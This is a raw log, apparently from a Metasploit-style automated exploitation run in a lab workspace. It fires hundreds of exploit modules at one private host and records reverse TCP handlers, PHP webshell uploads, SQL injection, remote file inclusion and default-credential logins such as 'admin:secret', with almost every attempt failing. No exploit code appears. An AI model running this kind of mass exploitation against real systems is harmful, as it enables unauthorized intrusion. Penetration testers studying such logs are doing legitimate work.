[*] [2016.06.04-10:00:10] [0453] Started reverse TCP handler on 0.0.0.0:1308
[*] [2016.06.04-10:00:10] [0453] Authenticating as user 'admin'
[-] [2016.06.04-10:00:11] [0453] Exploit aborted due to failure: no-access: 10.198.0.1:80 - Authentication failed
[+] [2016.06.04-10:00:11] Workspace:lab5 Progress:458/775 (59%) [454/770] 10.198.0.1:8080 - Apache Struts Dynamic Method Invocation Remote Code Execution
[!] [2016.06.04-10:00:11] [0454] ******************************************************************************************
[!] [2016.06.04-10:00:11] [0454] *                  The module linux/http/struts_dmi_exec is deprecated!                  *
[!] [2016.06.04-10:00:11] [0454] *                       It will be removed on or about 2016-06-01                        *
[!] [2016.06.04-10:00:11] [0454] *                     Use exploit/multi/http/struts_dmi_exec instead                     *
[!] [2016.06.04-10:00:11] [0454] ******************************************************************************************
[!] [2016.06.04-10:00:11] [0454] ******************************************************************************************
[!] [2016.06.04-10:00:11] [0454] *                  The module linux/http/struts_dmi_exec is deprecated!                  *
[!] [2016.06.04-10:00:11] [0454] *                       It will be removed on or about 2016-06-01                        *
[!] [2016.06.04-10:00:11] [0454] *                     Use exploit/multi/http/struts_dmi_exec instead                     *
[!] [2016.06.04-10:00:11] [0454] ******************************************************************************************
[*] [2016.06.04-10:00:11] [0454] Started reverse TCP handler on 0.0.0.0:1309
[*] [2016.06.04-10:00:11] [0454] 10.198.0.1:8080 - Uploading exploit to /tmp/xM222iR
[-] [2016.06.04-10:00:11] [0454] Exploit aborted due to failure: bad-config: Server returned HTTP 404, please double check TARGETURI
[+] [2016.06.04-10:00:12] Workspace:lab5 Progress:459/775 (59%) [455/770] 10.198.0.1:80 - Linksys WRT160nv2 apply.cgi Remote Command Injection
[-] [2016.06.04-10:00:12] No reverse connect payloads available for exploit/linux/http/linksys_wrt160nv2_apply_exec
[-] [2016.06.04-10:00:12] No payloads were compatible with exploit/linux/http/linksys_wrt160nv2_apply_exec)
[+] [2016.06.04-10:00:12] Workspace:lab5 Progress:460/775 (59%) [456/770] 10.198.0.1:80 - OpenEMR PHP File Upload Vulnerability
[*] [2016.06.04-10:00:12] [0456] Started reverse TCP handler on 0.0.0.0:1310
[*] [2016.06.04-10:00:12] [0456] Sending PHP payload (ydxTtz.php)
[-] [2016.06.04-10:00:13] [0456] Exploit aborted due to failure: not-vulnerable: 10.198.0.1:80 - File wasn't uploaded, aborting!
[+] [2016.06.04-10:00:13] Workspace:lab5 Progress:461/775 (59%) [457/770] 10.198.0.1:8080 - Apache Struts Dynamic Method Invocation Remote Code Execution
[*] [2016.06.04-10:00:13] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:00:13] [0457] Started reverse TCP handler on 0.0.0.0:1311
[*] [2016.06.04-10:00:13] [0457] 10.198.0.1:8080 - Uploading exploit to 1eL1Iy.jar, and executing it.
[+] [2016.06.04-10:00:24] Workspace:lab5 Progress:462/775 (59%) [458/770] 10.198.0.1:8080 - Basilic 1.5.14 diff.php Arbitrary Command Execution
[-] [2016.06.04-10:00:24] No reverse connect payloads available for exploit/unix/webapp/basilic_diff_exec
[-] [2016.06.04-10:00:24] No payloads were compatible with exploit/unix/webapp/basilic_diff_exec)
[-] [2016.06.04-10:00:24] [0458] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:00:25] Workspace:lab5 Progress:463/775 (59%) [459/770] 10.198.0.1:80 - PolarBear CMS PHP File Upload Vulnerability
[*] [2016.06.04-10:00:25] [0459] Started reverse TCP handler on 0.0.0.0:1312
[*] [2016.06.04-10:00:25] [0459] Uploading payload DrKET.php
[-] [2016.06.04-10:00:25] [0459] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Upload failed
[+] [2016.06.04-10:00:26] Workspace:lab5 Progress:464/775 (59%) [460/770] 10.198.0.1:8080 - Umbraco CMS Remote Command Execution
[*] [2016.06.04-10:00:26] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:00:26] [0460] Started reverse TCP handler on 0.0.0.0:1313
[*] [2016.06.04-10:00:27] [0460] Uploading 47376 bytes through /umbraco/webservices/codeEditorSave.asmx...
[*] [2016.06.04-10:00:27] [0460] Uploading to /umbraco/SSDMAC.aspx
[*] [2016.06.04-10:00:27] [0460] Didn't get the expected 500 error code /umbraco/webservices/codeEditorSave.asmx [500 Not Found]. Trying to execute the payload anyway
[*] [2016.06.04-10:00:27] [0460] Executing /umbraco/SSDMAC.aspx...
[-] [2016.06.04-10:00:27] [0460] Execution failed on /umbraco/SSDMAC.aspx [404 Not Found]
[+] [2016.06.04-10:00:44] Workspace:lab5 Progress:465/775 (60%) [461/770] 10.198.0.1:80 - SonicWALL GMS 6 Arbitrary File Upload
[*] [2016.06.04-10:00:44] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:00:44] [0461] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Apache-Coyote)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:00:44] Workspace:lab5 Progress:466/775 (60%) [462/770] 10.198.0.1:8080 - Sflog! CMS 1.0 Arbitrary File Upload Vulnerability
[*] [2016.06.04-10:00:44] [0462] Started reverse TCP handler on 0.0.0.0:1315
[*] [2016.06.04-10:00:44] [0462] Attempt to login as 'admin:secret'
[-] [2016.06.04-10:00:44] [0462] Unable to login
[+] [2016.06.04-10:00:47] Workspace:lab5 Progress:467/775 (60%) [463/770] 10.198.0.1:8080 - WebPageTest Arbitrary PHP File Upload
[*] [2016.06.04-10:00:47] [0463] Started reverse TCP handler on 0.0.0.0:1316
[*] [2016.06.04-10:00:47] [0463] Uploading payload (1285 bytes)...
[*] [2016.06.04-10:00:47] [0463] Requesting /www/results/blah.php
[-] [2016.06.04-10:00:48] [0463] Payload failed to upload
[+] [2016.06.04-10:00:50] Workspace:lab5 Progress:468/775 (60%) [464/770] 10.198.0.1:8080 - EGallery PHP File Upload Vulnerability
[*] [2016.06.04-10:00:50] [0464] Started reverse TCP handler on 0.0.0.0:1317
[*] [2016.06.04-10:00:50] [0464] Sending PHP payload (tKGSzdOwKO.php)
[-] [2016.06.04-10:00:51] [0464] File wasn't uploaded, aborting!
[+] [2016.06.04-10:00:53] Workspace:lab5 Progress:469/775 (60%) [465/770] 10.198.0.1:8080 - Symantec Web Gateway 5.0.2.18 pbcontrol.php Command Injection
[-] [2016.06.04-10:00:53] No reverse connect payloads available for exploit/linux/http/symantec_web_gateway_pbcontrol
[-] [2016.06.04-10:00:53] No payloads were compatible with exploit/linux/http/symantec_web_gateway_pbcontrol)
[-] [2016.06.04-10:00:53] [0465] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:00:54] Workspace:lab5 Progress:470/775 (60%) [466/770] 10.198.0.1:8080 - Dell SonicWALL (Plixer) Scrutinizer 9 SQL Injection
[*] [2016.06.04-10:00:54] [0466] Started reverse TCP handler on 0.0.0.0:1318
[*] [2016.06.04-10:00:54] [0466] Sending SQL injection...
[-] [2016.06.04-10:00:54] [0466] I don't think the SQL Injection attempt worked
[+] [2016.06.04-10:00:57] Workspace:lab5 Progress:471/775 (60%) [467/770] 10.198.0.1:80 - DataLife Engine preview.php PHP Code Injection
[*] [2016.06.04-10:00:57] [0467] Started reverse TCP handler on 0.0.0.0:1319
[*] [2016.06.04-10:00:57] [0467] Exploiting the preg_replace() to execute PHP code
[+] [2016.06.04-10:01:00] Workspace:lab5 Progress:472/775 (60%) [468/770] 10.198.0.1:80 - Kordil EDMS v2.2.60rc3 Unauthenticated Arbitrary File Upload Vulnerability
[*] [2016.06.04-10:01:00] [0468] Started reverse TCP handler on 0.0.0.0:1320
[*] [2016.06.04-10:01:00] [0468] Uploading PHP payload (946 bytes)
[-] [2016.06.04-10:01:00] [0468] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Uploading PHP payload failed
[+] [2016.06.04-10:01:01] Workspace:lab5 Progress:473/775 (61%) [469/770] 10.198.0.1:8080 - Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential
[*] [2016.06.04-10:01:01] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:01:01] [0469] Started reverse TCP handler on 0.0.0.0:1321
[*] [2016.06.04-10:01:02] [0469] 10.198.0.1:8080 - Uploading 13077 bytes via MySQL...
[-] [2016.06.04-10:01:02] [0469] 10.198.0.1:3306 - Connection refused
[-] [2016.06.04-10:01:02] [0469] 10.198.0.1:3306 - That MySQL upload didn't work.
[+] [2016.06.04-10:01:50] Workspace:lab5 Progress:474/775 (61%) [470/770] 10.198.0.1:8080 - Cyclope Employee Surveillance Solution v6 SQL Injection
[*] [2016.06.04-10:01:50] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:01:51] [0470] Started reverse TCP handler on 0.0.0.0:1322
[-] [2016.06.04-10:01:51] [0470] Unable to determine the version number
[+] [2016.06.04-10:02:36] Workspace:lab5 Progress:475/775 (61%) [471/770] 10.198.0.1:80 - MiniWeb (Build 300) Arbitrary File Upload
[*] [2016.06.04-10:02:36] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:02:37] [0471] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:MiniWeb)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:02:37] Workspace:lab5 Progress:476/775 (61%) [472/770] 10.198.0.1:8080 - CuteFlow v2.11.2 Arbitrary File Upload Vulnerability
[*] [2016.06.04-10:02:37] [0472] Started reverse TCP handler on 0.0.0.0:1324
[*] [2016.06.04-10:02:37] [0472] Uploading PHP payload (1285 bytes)
[*] [2016.06.04-10:02:37] [0472] Retrieving file: CVcJFaA.php
[+] [2016.06.04-10:02:40] Workspace:lab5 Progress:477/775 (61%) [473/770] 10.198.0.1:80 - WordPress W3 Total Cache PHP Code Execution
[*] [2016.06.04-10:02:40] [0473] Started reverse TCP handler on 0.0.0.0:1325
[-] [2016.06.04-10:02:41] [0473] Exploit aborted due to failure: no-target: / does not seeem to be Wordpress site
[+] [2016.06.04-10:02:41] Workspace:lab5 Progress:478/775 (61%) [474/770] 10.198.0.1:8080 - Oracle Business Transaction Management FlashTunnelService Remote Code Execution
[*] [2016.06.04-10:02:41] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:02:41] No reverse connect payloads available for exploit/windows/http/oracle_btm_writetofile
[-] [2016.06.04-10:02:41] No payloads were compatible with exploit/windows/http/oracle_btm_writetofile)
[-] [2016.06.04-10:02:41] [0474] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:02:42] Workspace:lab5 Progress:479/775 (61%) [475/770] 10.198.0.1:80 - D-Link Devices Unauthenticated Remote Command Execution
[-] [2016.06.04-10:02:42] No reverse connect payloads available for exploit/linux/http/dlink_dir300_exec_telnet
[-] [2016.06.04-10:02:42] No payloads were compatible with exploit/linux/http/dlink_dir300_exec_telnet)
[*] [2016.06.04-10:02:42] [0475] 10.198.0.1:80 - Trying to login with admin / admin
[-] [2016.06.04-10:02:42] [0475] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Could not connect to the webservice - check the server banner
[+] [2016.06.04-10:02:43] Workspace:lab5 Progress:480/775 (61%) [476/770] 10.198.0.1:80 - phpMyAdmin Authenticated Remote Code Execution via preg_replace()
[*] [2016.06.04-10:02:43] [0476] Started reverse TCP handler on 0.0.0.0:1326
[*] [2016.06.04-10:02:43] [0476] Grabbing CSRF token...
[-] [2016.06.04-10:02:43] [0476] Exploit aborted due to failure: not-found: Couldn't find token. Is URI set correctly?
[+] [2016.06.04-10:02:43] Workspace:lab5 Progress:481/775 (62%) [477/770] 10.198.0.1:8080 - XODA 0.4.5 Arbitrary PHP File Upload Vulnerability
[*] [2016.06.04-10:02:43] [0477] Started reverse TCP handler on 0.0.0.0:1327
[*] [2016.06.04-10:02:43] [0477] Sending PHP payload (fEmcFkDe.php)
[-] [2016.06.04-10:02:43] [0477] File wasn't uploaded, aborting!
[+] [2016.06.04-10:02:46] Workspace:lab5 Progress:482/775 (62%) [478/770] 10.198.0.1:8080 - Webmin /file/show.cgi Remote Command Execution
[-] [2016.06.04-10:02:46] No reverse connect payloads available for exploit/unix/webapp/webmin_show_cgi_exec
[-] [2016.06.04-10:02:46] No payloads were compatible with exploit/unix/webapp/webmin_show_cgi_exec)
[+] [2016.06.04-10:02:47] Workspace:lab5 Progress:483/775 (62%) [479/770] 10.198.0.1:80 - GroundWork monarch_scan.cgi OS Command Injection
[-] [2016.06.04-10:02:47] No reverse connect payloads available for exploit/linux/http/groundwork_monarch_cmd_exec
[-] [2016.06.04-10:02:47] No payloads were compatible with exploit/linux/http/groundwork_monarch_cmd_exec)
[-] [2016.06.04-10:02:47] [0479] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:02:47] Workspace:lab5 Progress:484/775 (62%) [480/770] 10.198.0.1:8080 - WAN Emulator v2.3 Command Execution
[-] [2016.06.04-10:02:47] No reverse connect payloads available for exploit/linux/http/wanem_exec
[-] [2016.06.04-10:02:47] No payloads were compatible with exploit/linux/http/wanem_exec)
[-] [2016.06.04-10:02:47] [0480] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:02:48] Workspace:lab5 Progress:485/775 (62%) [481/770] 10.198.0.1:80 - vBulletin index.php/ajax/api/reputation/vote nodeid Parameter SQL Injection
[*] [2016.06.04-10:02:48] [0481] Started reverse TCP handler on 0.0.0.0:1328
[*] [2016.06.04-10:02:48] [0481] Checking for a valid node id...
[*] [2016.06.04-10:02:48] [0481] Brute forcing to find a valid node id...
[-] [2016.06.04-10:03:05] [0481] node id not found
[+] [2016.06.04-10:03:08] Workspace:lab5 Progress:486/775 (62%) [482/770] 10.198.0.1:8080 - TestLink v1.9.3 Arbitrary File Upload Vulnerability
[*] [2016.06.04-10:03:08] [0482] Started reverse TCP handler on 0.0.0.0:1329
[*] [2016.06.04-10:03:08] [0482] Registering user (KshpswntdN4rl)
[-] [2016.06.04-10:03:08] [0482] Registration failed
[+] [2016.06.04-10:03:11] Workspace:lab5 Progress:487/775 (62%) [483/770] 10.198.0.1:8080 - E-Mail Security Virtual Appliance learn-msg.cgi Command Injection
[-] [2016.06.04-10:03:11] No reverse connect payloads available for exploit/linux/http/esva_exec
[-] [2016.06.04-10:03:11] No payloads were compatible with exploit/linux/http/esva_exec)
[-] [2016.06.04-10:03:11] [0483] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:03:12] Workspace:lab5 Progress:488/775 (62%) [484/770] 10.198.0.1:8080 - MobileCartly 1.0 Arbitrary File Creation Vulnerability
[*] [2016.06.04-10:03:12] [0484] Started reverse TCP handler on 0.0.0.0:1330
[*] [2016.06.04-10:03:12] [0484] Uploading payload
[*] [2016.06.04-10:03:12] [0484] Requesting 'NqhDb.php'
[+] [2016.06.04-10:03:15] Workspace:lab5 Progress:489/775 (63%) [485/770] 10.198.0.1:80 - GetSimpleCMS PHP File Upload Vulnerability
[+] [2016.06.04-10:03:15] Workspace:lab5 Progress:490/775 (63%) [486/770] 10.198.0.1:80 - Mutiny 5 Arbitrary File Upload
[-] [2016.06.04-10:03:16] [0486] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Apache-Coyote)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:03:16] Workspace:lab5 Progress:491/775 (63%) [487/770] 10.198.0.1:8080 - Auxilium RateMyPet Arbitrary File Upload Vulnerability
[*] [2016.06.04-10:03:16] [0487] Started reverse TCP handler on 0.0.0.0:1333
[*] [2016.06.04-10:03:16] [0487] Uploading payload (1312 bytes)...
[*] [2016.06.04-10:03:16] [0487] Requesting 'pEaxc.php'...
[-] [2016.06.04-10:03:16] [0487] Upload unsuccessful: 404
[+] [2016.06.04-10:03:19] Workspace:lab5 Progress:492/775 (63%) [488/770] 10.198.0.1:8080 - ZEN Load Balancer Filelog Command Execution
[-] [2016.06.04-10:03:19] No reverse connect payloads available for exploit/linux/http/zen_load_balancer_exec
[-] [2016.06.04-10:03:19] No payloads were compatible with exploit/linux/http/zen_load_balancer_exec)
[-] [2016.06.04-10:03:19] [0488] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:03:20] Workspace:lab5 Progress:493/775 (63%) [489/770] 10.198.0.1:80 - Openfiler v2.x NetworkCard Command Execution
[-] [2016.06.04-10:03:20] No reverse connect payloads available for exploit/linux/http/openfiler_networkcard_exec
[-] [2016.06.04-10:03:20] No payloads were compatible with exploit/linux/http/openfiler_networkcard_exec)
[-] [2016.06.04-10:03:20] [0489] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:03:20] Workspace:lab5 Progress:494/775 (63%) [490/770] 10.198.0.1:80 - ZPanel 10.0.0.2 htpasswd Module Username Command Execution
[-] [2016.06.04-10:03:20] No reverse connect payloads available for exploit/unix/webapp/zpanel_username_exec
[-] [2016.06.04-10:03:20] No payloads were compatible with exploit/unix/webapp/zpanel_username_exec)
[+] [2016.06.04-10:03:21] Workspace:lab5 Progress:495/775 (63%) [491/770] 10.198.0.1:80 - VMware vCenter Chargeback Manager ImageUploadServlet Arbitrary File Upload
[*] [2016.06.04-10:03:21] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:03:21] [0491] Exploit aborted due to failure: not-found: The target server fingerprint "Apache/2.4.10 (Debian) ( 302-http://10.198.0.1/login.php )" does not match "(?-mix:Apache.*Win32)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:03:22] Workspace:lab5 Progress:496/775 (64%) [492/770] 10.198.0.1:80 - LibrettoCMS File Manager Arbitary File Upload Vulnerability
[*] [2016.06.04-10:03:22] [0492] Started reverse TCP handler on 0.0.0.0:1335
[*] [2016.06.04-10:03:22] [0492] Uploading malicious file...
[-] [2016.06.04-10:03:22] [0492] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Unknown reply: 302
[+] [2016.06.04-10:03:22] Workspace:lab5 Progress:497/775 (64%) [493/770] 10.198.0.1:80 - Havalite CMS Arbitary File Upload Vulnerability
[*] [2016.06.04-10:03:22] [0493] Started reverse TCP handler on 0.0.0.0:1336
[*] [2016.06.04-10:03:22] [0493] Uploading malicious file...
[*] [2016.06.04-10:03:22] [0493] Executing XkPHX.php...
[+] [2016.06.04-10:03:25] Workspace:lab5 Progress:498/775 (64%) [494/770] 10.198.0.1:8080 - Project Pier Arbitrary File Upload Vulnerability
[*] [2016.06.04-10:03:25] [0494] Started reverse TCP handler on 0.0.0.0:1337
[*] [2016.06.04-10:03:25] [0494] Uploading PHP payload (973 bytes)...
[*] [2016.06.04-10:03:25] [0494] Executing 'egnDa.php.1'...
[+] [2016.06.04-10:03:28] Workspace:lab5 Progress:499/775 (64%) [495/770] 10.198.0.1:80 - Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution
[*] [2016.06.04-10:03:28] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:03:28] [0495] Started reverse TCP handler on 0.0.0.0:1338
[*] [2016.06.04-10:03:28] [0495] 10.198.0.1:80 - Target autodetection...
[-] [2016.06.04-10:03:28] [0495] Exploit aborted due to failure: no-target: 10.198.0.1:80 - Target auto-detection didn't work
[+] [2016.06.04-10:03:29] Workspace:lab5 Progress:500/775 (64%) [496/770] 10.198.0.1:80 - vTiger CRM SOAP AddEmailAttachment Arbitrary File Upload
[*] [2016.06.04-10:03:29] [0496] Started reverse TCP handler on 0.0.0.0:1340
[*] [2016.06.04-10:03:29] [0496] Uploading payload...
[-] [2016.06.04-10:03:29] [0496] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Upload failed
[+] [2016.06.04-10:03:30] Workspace:lab5 Progress:501/775 (64%) [497/770] 10.198.0.1:8080 - ManageEngine Security Manager Plus 5.5 Build 5505 SQL Injection
[*] [2016.06.04-10:03:30] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:03:30] [0497] Started reverse TCP handler on 0.0.0.0:1341
[-] [2016.06.04-10:03:30] [0497] 10.198.0.1:8080 - Unable to select a target, we must bail.
[+] [2016.06.04-10:05:17] Workspace:lab5 Progress:502/775 (64%) [498/770] 10.198.0.1:8080 - Invision IP.Board unserialize() PHP Code Execution
[*] [2016.06.04-10:05:17] [0498] Started reverse TCP handler on 0.0.0.0:1342
[*] [2016.06.04-10:05:17] [0498] Exploiting the unserialize() to upload PHP code
[*] [2016.06.04-10:05:17] [0498] Checking for cookie prefix
[-] [2016.06.04-10:05:18] [0498] Exploit failed: 404
[+] [2016.06.04-10:05:20] Workspace:lab5 Progress:503/775 (64%) [499/770] 10.198.0.1:8080 - PhpTax pfilez Parameter Exec Remote Code Injection
[-] [2016.06.04-10:05:20] No reverse connect payloads available for exploit/multi/http/phptax_exec
[-] [2016.06.04-10:05:20] No payloads were compatible with exploit/multi/http/phptax_exec)
[-] [2016.06.04-10:05:20] [0499] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:21] Workspace:lab5 Progress:504/775 (65%) [500/770] 10.198.0.1:8080 - WordPress Plugin Advanced Custom Fields Remote File Inclusion
[*] [2016.06.04-10:05:21] [0500] Started reverse TCP handler on 0.0.0.0:1343
[*] [2016.06.04-10:05:21] [0500] Using URL: http://0.0.0.0:1344/cr17eN9
[*] [2016.06.04-10:05:21] [0500] Local IP: http://10.0.2.15:1344/cr17eN9
[*] [2016.06.04-10:05:21] [0500] PHP include server started.
[*] [2016.06.04-10:05:21] [0500] Sending request
[-] [2016.06.04-10:05:21] [0500] Exploit aborted due to failure: unexpected-reply: Unexpected reply - 404
[+] [2016.06.04-10:05:21] Workspace:lab5 Progress:505/775 (65%) [501/770] 10.198.0.1:80 - Oracle Endeca Server Remote Command Execution
[*] [2016.06.04-10:05:22] [0501] Started reverse TCP handler on 0.0.0.0:1345
[*] [2016.06.04-10:05:22] [0501] Powershell command length: 2301
[*] [2016.06.04-10:05:22] [0501] Exploiting through Powershell...
[*] [2016.06.04-10:05:22] [0501] 302
[-] [2016.06.04-10:05:22] [0501] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Unable to execute the CMD Stager
[+] [2016.06.04-10:05:22] Workspace:lab5 Progress:506/775 (65%) [502/770] 10.198.0.1:8080 - Narcissus Image Configuration Passthru Vulnerability
[-] [2016.06.04-10:05:22] No reverse connect payloads available for exploit/unix/webapp/narcissus_backend_exec
[-] [2016.06.04-10:05:22] No payloads were compatible with exploit/unix/webapp/narcissus_backend_exec)
[-] [2016.06.04-10:05:22] [0502] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:23] Workspace:lab5 Progress:507/775 (65%) [503/770] 10.198.0.1:8080 - Adobe IndesignServer 5.5 SOAP Server Arbitrary Script Execution
[*] [2016.06.04-10:05:23] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:05:23] No reverse connect payloads available for exploit/multi/misc/indesign_server_soap
[-] [2016.06.04-10:05:23] No payloads were compatible with exploit/multi/misc/indesign_server_soap)
[-] [2016.06.04-10:05:23] [0503] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:23] Workspace:lab5 Progress:508/775 (65%) [504/770] 10.198.0.1:80 - PineApp Mail-SeCure livelog.html Arbitrary Command Execution
[-] [2016.06.04-10:05:23] No reverse connect payloads available for exploit/linux/http/pineapp_livelog_exec
[-] [2016.06.04-10:05:23] No payloads were compatible with exploit/linux/http/pineapp_livelog_exec)
[-] [2016.06.04-10:05:23] [0504] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:24] Workspace:lab5 Progress:509/775 (65%) [505/770] 10.198.0.1:8080 - Ektron 8.02 XSLT Transform Remote Code Execution
[*] [2016.06.04-10:05:24] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:05:24] [0505] Started reverse TCP handler on 0.0.0.0:1346
[*] [2016.06.04-10:05:24] [0505] Generating the EXE Payload and the XSLT...
[*] [2016.06.04-10:05:24] [0505] Trying to run the xslt transformation...
[-] [2016.06.04-10:05:24] [0505] Exploit aborted due to failure: unknown: There was an unexpected response to the xslt transformation request
[+] [2016.06.04-10:05:25] Workspace:lab5 Progress:510/775 (65%) [506/770] 10.198.0.1:8080 - TWiki MAKETEXT Remote Command Execution
[-] [2016.06.04-10:05:25] No reverse connect payloads available for exploit/unix/webapp/twiki_maketext
[-] [2016.06.04-10:05:25] No payloads were compatible with exploit/unix/webapp/twiki_maketext)
[-] [2016.06.04-10:05:25] [0506] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:25] Workspace:lab5 Progress:511/775 (65%) [507/770] 10.198.0.1:8080 - Foswiki MAKETEXT Remote Command Execution
[-] [2016.06.04-10:05:25] No reverse connect payloads available for exploit/unix/webapp/foswiki_maketext
[-] [2016.06.04-10:05:25] No payloads were compatible with exploit/unix/webapp/foswiki_maketext)
[-] [2016.06.04-10:05:25] [0507] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:26] Workspace:lab5 Progress:512/775 (66%) [508/770] 10.198.0.1:8080 - eXtplorer v2.1 Arbitrary File Upload Vulnerability
[*] [2016.06.04-10:05:26] [0508] Started reverse TCP handler on 0.0.0.0:1347
[*] [2016.06.04-10:05:26] [0508] Authenticating as user (admin)
[-] [2016.06.04-10:05:26] [0508] Exploit aborted due to failure: no-access: 10.198.0.1:8080 - Authentication failed
[+] [2016.06.04-10:05:26] Workspace:lab5 Progress:513/775 (66%) [509/770] 10.198.0.1:80 - PineApp Mail-SeCure ldapsyncnow.php Arbitrary Command Execution
[-] [2016.06.04-10:05:26] No reverse connect payloads available for exploit/linux/http/pineapp_ldapsyncnow_exec
[-] [2016.06.04-10:05:26] No payloads were compatible with exploit/linux/http/pineapp_ldapsyncnow_exec)
[-] [2016.06.04-10:05:26] [0509] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:27] Workspace:lab5 Progress:514/775 (66%) [510/770] 10.198.0.1:80 - PineApp Mail-SeCure test_li_connection.php Arbitrary Command Execution
[-] [2016.06.04-10:05:27] No reverse connect payloads available for exploit/linux/http/pineapp_test_li_conn_exec
[-] [2016.06.04-10:05:27] No payloads were compatible with exploit/linux/http/pineapp_test_li_conn_exec)
[-] [2016.06.04-10:05:27] [0510] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:28] Workspace:lab5 Progress:515/775 (66%) [511/770] 10.198.0.1:8080 - Wordpress Reflex Gallery Upload Vulnerability
[*] [2016.06.04-10:05:28] [0511] Started reverse TCP handler on 0.0.0.0:1348
[-] [2016.06.04-10:05:28] [0511] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Unable to deploy payload, server returned 404
[+] [2016.06.04-10:05:28] Workspace:lab5 Progress:516/775 (66%) [512/770] 10.198.0.1:8080 - Ruby on Rails XML Processor YAML Deserialization Code Execution
[-] [2016.06.04-10:05:28] No reverse connect payloads available for exploit/multi/http/rails_xml_yaml_code_exec
[-] [2016.06.04-10:05:28] No payloads were compatible with exploit/multi/http/rails_xml_yaml_code_exec)
[-] [2016.06.04-10:05:28] [0512] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:29] Workspace:lab5 Progress:517/775 (66%) [513/770] 10.198.0.1:8080 - PHP-Charts v1.0 PHP Code Execution Vulnerability
[-] [2016.06.04-10:05:29] No reverse connect payloads available for exploit/unix/webapp/php_charts_exec
[-] [2016.06.04-10:05:29] No payloads were compatible with exploit/unix/webapp/php_charts_exec)
[-] [2016.06.04-10:05:29] [0513] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:29] Workspace:lab5 Progress:518/775 (66%) [514/770] 10.198.0.1:80 - OpenX Backdoor PHP Code Execution
[*] [2016.06.04-10:05:30] [0514] Started reverse TCP handler on 0.0.0.0:1349
[+] [2016.06.04-10:05:30] Workspace:lab5 Progress:519/775 (66%) [515/770] 10.198.0.1:80 - VICIdial Manager Send OS Command Injection
[-] [2016.06.04-10:05:30] No reverse connect payloads available for exploit/unix/webapp/vicidial_manager_send_cmd_exec
[-] [2016.06.04-10:05:30] No payloads were compatible with exploit/unix/webapp/vicidial_manager_send_cmd_exec)
[-] [2016.06.04-10:05:30] [0515] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:30] Workspace:lab5 Progress:520/775 (67%) [516/770] 10.198.0.1:8080 - ZoneMinder Video Server packageControl Command Execution
[-] [2016.06.04-10:05:31] No reverse connect payloads available for exploit/unix/webapp/zoneminder_packagecontrol_exec
[-] [2016.06.04-10:05:31] No payloads were compatible with exploit/unix/webapp/zoneminder_packagecontrol_exec)
[-] [2016.06.04-10:05:31] [0516] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:31] Workspace:lab5 Progress:521/775 (67%) [517/770] 10.198.0.1:80 - HP ProCurve Manager SNAC UpdateDomainControllerServlet File Upload
[-] [2016.06.04-10:05:31] No reverse connect payloads available for exploit/windows/http/hp_pcm_snac_update_domain
[-] [2016.06.04-10:05:31] No payloads were compatible with exploit/windows/http/hp_pcm_snac_update_domain)
[-] [2016.06.04-10:05:31] [0517] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:32] Workspace:lab5 Progress:522/775 (67%) [518/770] 10.198.0.1:8080 - Ruby on Rails JSON Processor YAML Deserialization Code Execution
[-] [2016.06.04-10:05:32] No reverse connect payloads available for exploit/multi/http/rails_json_yaml_code_exec
[-] [2016.06.04-10:05:32] No payloads were compatible with exploit/multi/http/rails_json_yaml_code_exec)
